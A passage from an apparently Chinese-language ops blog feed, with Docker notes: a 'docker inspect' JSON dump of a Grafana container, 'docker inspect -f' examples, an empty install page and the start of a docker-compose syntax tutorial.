class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Links&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;OomScoreAdj&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;PidMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Privileged&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;PublishAllPorts&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ReadonlyRootfs&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;SecurityOpt&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;UTSMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;UsernsMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;ShmSize&quot;</span>: <span class="hljs-number">67108864</span>,<br>            <span class="hljs-string">&quot;Runtime&quot;</span>: <span class="hljs-string">&quot;runc&quot;</span>,<br>            <span class="hljs-string">&quot;ConsoleSize&quot;</span>: [<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-number">0</span><br>            ],<br>            <span class="hljs-string">&quot;Isolation&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;CpuShares&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;Memory&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;NanoCpus&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CgroupParent&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;BlkioWeight&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;BlkioWeightDevice&quot;</span>: [],<br>            <span class="hljs-string">&quot;BlkioDeviceReadBps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;BlkioDeviceWriteBps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;BlkioDeviceReadIOps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;BlkioDeviceWriteIOps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CpuPeriod&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuQuota&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuRealtimePeriod&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuRealtimeRuntime&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpusetCpus&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;CpusetMems&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Devices&quot;</span>: [],<br>            <span class="hljs-string">&quot;DeviceCgroupRules&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;DeviceRequests&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;KernelMemory&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;KernelMemoryTCP&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MemoryReservation&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MemorySwap&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MemorySwappiness&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;OomKillDisable&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;PidsLimit&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Ulimits&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CpuCount&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuPercent&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;IOMaximumIOps&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;IOMaximumBandwidth&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MaskedPaths&quot;</span>: [<br>                <span class="hljs-string">&quot;/proc/asound&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/acpi&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/kcore&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/keys&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/latency_stats&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/timer_list&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/timer_stats&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/sched_debug&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/scsi&quot;</span>,<br>                <span class="hljs-string">&quot;/sys/firmware&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;ReadonlyPaths&quot;</span>: [<br>                <span class="hljs-string">&quot;/proc/bus&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/fs&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/irq&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/sys&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/sysrq-trigger&quot;</span><br>            ]<br>        &#125;,<br>        <span class="hljs-string">&quot;GraphDriver&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Data&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;LowerDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885-init/diff:/var/lib/docker/overlay2/633c4f694e05024bd76ad9fa14e1c6e91eafa6fc167d32d65323885a9716bc35/diff:/var/lib/docker/overlay2/3ecd937d9ada1a8fca42695112f838d4e6eecad76e4da399deacb18ef3649f82/diff:/var/lib/docker/overlay2/034018bf0da3afd6cf8bea09c68058ed00aef54e0874542ab6b0cd0b5a2f5b02/diff:/var/lib/docker/overlay2/6a03f6c5a8ecfae171548b33f90b727a03afd182a426885717725fbd33e1e336/diff:/var/lib/docker/overlay2/e0ab3c204ba426a01ca2074f17047430c05eecc9d07a1e950e1bc0a49bb46181/diff:/var/lib/docker/overlay2/2f13d908a74a801add00f7fff9820ccfb297beac35a2d91ea05f812e2de3faf2/diff:/var/lib/docker/overlay2/5342538fe3dcd1ce2077dc5ac82efaed68d7fa18d7d58e2c41129f1f0c3a0b3f/diff:/var/lib/docker/overlay2/40c7b37364a365de1537dd0a8fbf60f9fc1484feb520fea5a45e396dcbb4e121/diff:/var/lib/docker/overlay2/a02e590a00667b827a1e3c789b75c3bb846586593bf2fc8015546a8351f77443/diff&quot;</span>,<br>                <span class="hljs-string">&quot;MergedDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885/merged&quot;</span>,<br>                <span class="hljs-string">&quot;UpperDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885/diff&quot;</span>,<br>                <span class="hljs-string">&quot;WorkDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885/work&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;Mounts&quot;</span>: [],<br>        <span class="hljs-string">&quot;Config&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Hostname&quot;</span>: <span class="hljs-string">&quot;4b0e2ed242e0&quot;</span>,<br>            <span class="hljs-string">&quot;Domainname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&quot;472&quot;</span>,<br>            <span class="hljs-string">&quot;AttachStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStdout&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStderr&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ExposedPorts&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;3000/tcp&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;Tty&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;OpenStdin&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;StdinOnce&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Env&quot;</span>: [<br>                <span class="hljs-string">&quot;PATH=/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_CONFIG=/etc/grafana/grafana.ini&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_DATA=/var/lib/grafana&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_HOME=/usr/share/grafana&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_LOGS=/var/log/grafana&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_PLUGINS=/var/lib/grafana/plugins&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_PROVISIONING=/etc/grafana/provisioning&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Cmd&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;aeeaa96eea83&quot;</span>,<br>            <span class="hljs-string">&quot;Volumes&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;/usr/share/grafana&quot;</span>,<br>            <span class="hljs-string">&quot;Entrypoint&quot;</span>: [<br>                <span class="hljs-string">&quot;/run.sh&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;OnBuild&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Labels&quot;</span>: &#123;&#125;<br>        &#125;,<br>        <span class="hljs-string">&quot;NetworkSettings&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Bridge&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;SandboxID&quot;</span>: <span class="hljs-string">&quot;d5029e992abf128054cd8dcb811ef7fcddde6c94578e84b3ad41b309eeea0301&quot;</span>,<br>            <span class="hljs-string">&quot;HairpinMode&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;LinkLocalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;LinkLocalIPv6PrefixLen&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;Ports&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;3000/tcp&quot;</span>: <span class="hljs-literal">null</span><br>            &#125;,<br>            <span class="hljs-string">&quot;SandboxKey&quot;</span>: <span class="hljs-string">&quot;/var/run/docker/netns/d5029e992abf&quot;</span>,<br>            <span class="hljs-string">&quot;SecondaryIPAddresses&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;SecondaryIPv6Addresses&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;EndpointID&quot;</span>: <span class="hljs-string">&quot;14e461fe748eea297b8d84f043159905b7956018493b45476442b060ed2e9c3d&quot;</span>,<br>            <span class="hljs-string">&quot;Gateway&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>,<br>            <span class="hljs-string">&quot;GlobalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;GlobalIPv6PrefixLen&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;IPAddress&quot;</span>: <span class="hljs-string">&quot;172.17.0.3&quot;</span>,<br>            <span class="hljs-string">&quot;IPPrefixLen&quot;</span>: <span class="hljs-number">16</span>,<br>            <span class="hljs-string">&quot;IPv6Gateway&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;MacAddress&quot;</span>: <span class="hljs-string">&quot;02:42:ac:11:00:03&quot;</span>,<br>            <span class="hljs-string">&quot;Networks&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;bridge&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;IPAMConfig&quot;</span>: <span class="hljs-literal">null</span>,<br>                    <span class="hljs-string">&quot;Links&quot;</span>: <span class="hljs-literal">null</span>,<br>                    <span class="hljs-string">&quot;Aliases&quot;</span>: <span class="hljs-literal">null</span>,<br>                    <span class="hljs-string">&quot;NetworkID&quot;</span>: <span class="hljs-string">&quot;3934b22c38426e6823be8668550b7d3992929a89bd449089673db6dc3dbbef26&quot;</span>,<br>                    <span class="hljs-string">&quot;EndpointID&quot;</span>: <span class="hljs-string">&quot;14e461fe748eea297b8d84f043159905b7956018493b45476442b060ed2e9c3d&quot;</span>,<br>                    <span class="hljs-string">&quot;Gateway&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>,<br>                    <span class="hljs-string">&quot;IPAddress&quot;</span>: <span class="hljs-string">&quot;172.17.0.3&quot;</span>,<br>                    <span class="hljs-string">&quot;IPPrefixLen&quot;</span>: <span class="hljs-number">16</span>,<br>                    <span class="hljs-string">&quot;IPv6Gateway&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                    <span class="hljs-string">&quot;GlobalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                    <span class="hljs-string">&quot;GlobalIPv6PrefixLen&quot;</span>: <span class="hljs-number">0</span>,<br>                    <span class="hljs-string">&quot;MacAddress&quot;</span>: <span class="hljs-string">&quot;02:42:ac:11:00:03&quot;</span>,<br>                    <span class="hljs-string">&quot;DriverOpts&quot;</span>: <span class="hljs-literal">null</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>]<br></code></pre></td></tr></table></figure><h4 id="OPTIONS-9"><a href="#OPTIONS-9" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f-2"><a href="#f-2" class="headerlink" title="-f"></a>-f</h5><p>指定返回值的模版文件，类似 docker inspect –format</p><h4 id="实例-10"><a href="#实例-10" class="headerlink" title="实例"></a>实例</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  /tmp docker ps <br>CONTAINER ID   IMAGE                           COMMAND   CREATED         STATUS         PORTS     NAMES<br>61804e0083af   kalilinux/kali-rolling:latest   <span class="hljs-string">&quot;bash&quot;</span>    14 months ago   Up 3 seconds             kali<br></code></pre></td></tr></table></figure><h5 id="查看容器ID"><a href="#查看容器ID" class="headerlink" title="查看容器ID"></a>查看容器ID</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">docker inspect <span class="hljs-punctuation">-</span>f<span class="hljs-punctuation">=</span>&#x27;&#123;&#123;.Id&#125;&#x27; Name<span class="hljs-string">|Id</span><br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">➜  /tmp docker inspect -f=&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Id</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br><span class="language-xml">61804e0083afedef03947dc1189d5c4ecfc8f689885f8dffcac4dc4624caa00f</span><br></code></pre></td></tr></table></figure><h5 id="查看容器创建具体时间"><a href="#查看容器创建具体时间" class="headerlink" title="查看容器创建具体时间"></a>查看容器创建具体时间</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Created</span>&#125;&#125;</span><span class="language-xml">&#x27; Name|Id</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  /tmp docker ps <br>CONTAINER ID   IMAGE                           COMMAND   CREATED         STATUS         PORTS     NAMES<br>61804e0083af   kalilinux/kali-rolling:latest   <span class="hljs-string">&quot;bash&quot;</span>    14 months ago   Up 3 seconds             kali<br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">➜  /tmp docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Created</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br><span class="language-xml">2022-12-08T04:42:46.58388013Z</span><br></code></pre></td></tr></table></figure><h5 id="查看容器日志路径"><a href="#查看容器日志路径" class="headerlink" title="查看容器日志路径"></a>查看容器日志路径</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.LogPath</span>&#125;&#125;</span><span class="language-xml">&#x27; Name|Id</span><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">➜  /tmp docker <span class="hljs-keyword">inspect</span> -f <span class="hljs-string">&#x27;&#123;&#123;.LogPath&#125;&#125;&#x27;</span> <span class="hljs-number">61804</span>e0083af<br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/docker/</span>containers<span class="hljs-regexp">/61804e0083afedef03947dc1189d5c4ecfc8f689885f8dffcac4dc4624caa00f/</span><span class="hljs-number">61804</span>e0083afedef03947dc1189d5c4ecfc8f689885f8dffcac4dc4624caa00f-json.log<br></code></pre></td></tr></table></figure><h5 id="查看容器所使用镜像"><a href="#查看容器所使用镜像" class="headerlink" title="查看容器所使用镜像"></a>查看容器所使用镜像</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Image</span>&#125;&#125;</span><span class="language-xml">&#x27; Name|Id</span><br></code></pre></td></tr></table></figure><p>查询结果为镜像id，docker images 查询的id为镜像id的前12位</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">➜  ~ docker inspect -f &#x27;&#123;&#123;.Image&#125;&#125;&#x27; <span class="hljs-number">61804e0083</span>af<br>sha<span class="hljs-number">256</span>:<span class="hljs-number">0</span>d<span class="hljs-number">323592</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>f<span class="hljs-number">57780</span>d<span class="hljs-number">4</span>caa<span class="hljs-number">99</span>ba<span class="hljs-number">48e8867</span>d<span class="hljs-number">43532</span><span class="hljs-keyword">c</span><span class="hljs-number">72879</span>b<span class="hljs-number">31</span>ec<span class="hljs-number">0</span>b<span class="hljs-number">47</span>af<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>cfeb<span class="hljs-number">19</span><br>➜  ~ docker images | grep <span class="hljs-number">0</span>d<span class="hljs-number">3235</span><br>kalilinux/kali-rolling    latest       <span class="hljs-number">0</span>d<span class="hljs-number">323592</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>f<span class="hljs-number">5</span>   <span class="hljs-number">14</span> months ago   <span class="hljs-number">140</span>MB<br></code></pre></td></tr></table></figure><h5 id="查看容器名"><a href="#查看容器名" class="headerlink" title="查看容器名"></a>查看容器名</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f=&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Name</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  /tmp docker inspect -f=<span class="hljs-string">&#x27;&#123;&#123;.Name&#125;&#125;&#x27;</span> 61804e0083af<br>/kali<br>➜  /tmp docker ps | grep 61804e0083af<br>61804e0083af   kalilinux/kali-rolling:latest   <span class="hljs-string">&quot;bash&quot;</span>                   15 months ago   Up 7 minutes                                        kali<br>➜  /tmp <br><br></code></pre></td></tr></table></figure><h5 id="查看容器内IP"><a href="#查看容器内IP" class="headerlink" title="查看容器内IP"></a>查看容器内IP</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f=&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.NetworkSettings.Networks.bridge.IPAddress</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➜  /tmp docker inspect -f=&#x27;&#123;&#123;.NetworkSettings.Networks.bridge.IPAddress&#125;&#125;&#x27; 61804e0083af<br><span class="hljs-number">172.17.0.2</span><br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tap">➜  /tmp docker exec -it 61804e0083af &quot;ifconfig&quot;<br>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255<br>        ether 02:42:ac:11:00:02  txqueuelen<span class="hljs-number"> 0 </span> (Ethernet)<br>        RX packets<span class="hljs-number"> 15 </span> bytes<span class="hljs-number"> 1322 </span>(1.2 KiB)<br>        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0<br>        TX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0<br><br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        loop  txqueuelen<span class="hljs-number"> 1000 </span> (Local Loopback)<br>        RX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0<br>        TX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweiapplications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweiapplications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_install</title>
    <link href="/2024/02/20/yunwei/applications/docker/docker_install/"/>
    <url>/2024/02/20/yunwei/applications/docker/docker_install/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><h4 id="安装指定版本docker"><a href="#安装指定版本docker" class="headerlink" title="安装指定版本docker"></a>安装指定版本docker</h4><h5 id="安装基础环境"><a href="#安装基础环境" class="headerlink" title="安装基础环境"></a>安装基础环境</h5><h3 id="redhat"><a href="#redhat" class="headerlink" title="redhat"></a>redhat</h3><h3 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h3><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><h2 id="uninstall"><a href="#uninstall" class="headerlink" title="uninstall"></a>uninstall</h2><h3 id="ubuntu-1"><a href="#ubuntu-1" class="headerlink" title="ubuntu"></a>ubuntu</h3><h3 id="redhat-1"><a href="#redhat-1" class="headerlink" title="redhat"></a>redhat</h3><h3 id="mac-1"><a href="#mac-1" class="headerlink" title="mac"></a>mac</h3><h3 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h3>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweiapplications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweiapplications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_compose</title>
    <link href="/2024/02/20/yunwei/applications/docker/docker_compose/"/>
    <url>/2024/02/20/yunwei/applications/docker/docker_compose/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>项目（project）由一组关联的应用容器组成一个完整业务单元</p><p>服务（service）一个应用容器</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="version"><a href="#version" class="headerlink" title="version"></a>version</h3><p>指定yml基于的docker-compose版本</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">version</span>: &#x27;<span class="hljs-number">2</span>.<span class="hljs-number">3</span>&#x27;<br></code></pre></td></tr></table></figure><h3 id="services"><a href="#services" class="headerlink" title="services"></a>services</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">services</span>:<br>  <span class="hljs-attribute">redis</span>:<br>    <span class="hljs-attribute">image</span>: redis:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">9</span>-alpine<br></code></pre></td></tr></table></figure><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><p>指定容器运行的镜像</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">image:</span> redis<br><span class="hljs-params">image:</span> ubuntu:<span class="hljs-number">14.04</span><br><span class="hljs-params">image:</span> example-registry.com:<span class="hljs-number">4000</span><span class="hljs-symbol">/postgresql</span><br><span class="hljs-params">image:</span> a4bc65fd <span class="hljs-comment"># 镜像id</span><br><span class="hljs-params">image:</span> vulhub<span class="hljs-operator">/</span>airflow:<span class="hljs-number">1.10</span>.<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h3 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h3><p>添加环境变量，值可以为数组、字典或布尔值，布尔值需要使用引号，否则YML解析器转换为 True 或 False</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">postgresql</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres:12-alpine</span><br>  <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_USER=gitlab</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_PASSWORD=password</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 